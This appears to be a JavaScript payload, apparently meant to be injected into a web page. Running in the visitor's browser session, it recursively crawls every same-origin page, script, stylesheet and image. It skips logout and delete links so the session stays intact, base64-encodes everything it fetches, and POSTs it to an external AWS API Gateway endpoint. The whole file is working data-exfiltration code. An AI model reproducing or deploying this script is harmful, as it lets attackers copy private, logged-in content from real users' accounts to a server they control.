var base_url = null;
var processed_links = [];
var processed_scripts = [];
var processed_images = [];
var processed_icons = [];
var processed_styles = [];
var blackList = ['signout', 'sign_out', 'logout', 'log_out', 'delete', 'enforce-ssl'];

var storeData_URL = 'https://{{abcd1234}}.execute-api.us-east-1.amazonaws.com/dev/storeData';

$(document).ready(function() {
    base_url = window.location.host;
    var path = cleanPath(window.location.href);
    var html = $("html").html();

    processed_links.push(path);
    UploadData({
        site: base_url,
        path: path,
        body: btoa(unescape(encodeURIComponent(html)))
    });

    ProcessHTML($.parseHTML(html, true));
})

function ProcessHTML(html) {
    var links = $(html).find('a:not([href*=http],[href*="javascript:"],[href*="mailto:"])[href],a[href*="' + window.location.host + '"]');
    var scripts = $(html).filter('script:not([src*=http])[src],script[src*="' + window.location.host + '"]');
    var styles = $(html).filter('link[rel=stylesheet]');
    var icons = $(html).filter('link[rel=icon]');
    var images = $(html).find('img')

    ProcessElements(links, 'href', processed_links, true);
    ProcessElements(scripts, 'src', processed_scripts);
    ProcessElements(styles, 'href', processed_styles);
    ProcessImages(images, processed_images);
    ProcessImages(icons, processed_icons);
}

function ProcessElements(elements, path_attr, processed_list, recursive = false) {
    $(elements).each(function() {
        var element = this;
        var path = cleanPath($(element).attr(path_attr));

        if (!processed_list.includes(path) && !blackList.some(e => path.toLowerCase().includes(e))) {
            processed_list.push(path);

            $.get(path, function(result) {
                UploadData({
                    site: base_url,
                    path: path,
                    body: btoa(unescape(encodeURIComponent(result)))
                });

                console.log(path)

                if (recursive) {
                    ProcessHTML($.parseHTML(result, true));
                }
            });
        }
    })
}

function ProcessImages(elements, processed_list) {
    $(elements).each(function() {
        var element = this;
        var path = '';
        if (typeof $(element).attr('src') !== typeof undefined) {
            path = cleanPath($(element).attr('src'));
        } else if (typeof $(element).attr('href') !== typeof undefined) {
            path = cleanPath($(element).attr('href'));
        }

        if (!processed_list.includes(path) && !blackList.some(e => path.toLowerCase().includes(e))) {
            processed_list.push(path);

            console.log(path);
            convertImgToBase64(path, function(base64Img) {
                UploadData({
                    site: base_url,
                    path: path,
                    body: btoa(unescape(encodeURIComponent(base64Img)))
                });
            });
        }
    })
}

function UploadData(data) {
    $.ajax({
        url: storeData_URL,
        type: "POST",
        tryCount: 0,
        retryLimit: 3,
        data: JSON.stringify(data),
        contentType: "application/json",
        dataType: "json",
        processData: false
    })
    console.log(data);
}

function convertImgToBase64(url, callback, outputFormat) {
    var canvas = document.createElement('CANVAS');
    var ctx = canvas.getContext('2d');
    var img = new Image;
    img.crossOrigin = 'Anonymous';
    img.onload = function() {
        canvas.height = img.height;
        canvas.width = img.width;
        ctx.drawImage(img, 0, 0);
        var dataURL = canvas.toDataURL(outputFormat || 'image/png');
        callback.call(this, dataURL);
        canvas = null;
    };
    img.src = url;
}

function cleanPath(path) {
    var regex_host = "^.*" + window.location.host;
    var re = new RegExp(regex_host, "g");
    return path.replace(re, '');
}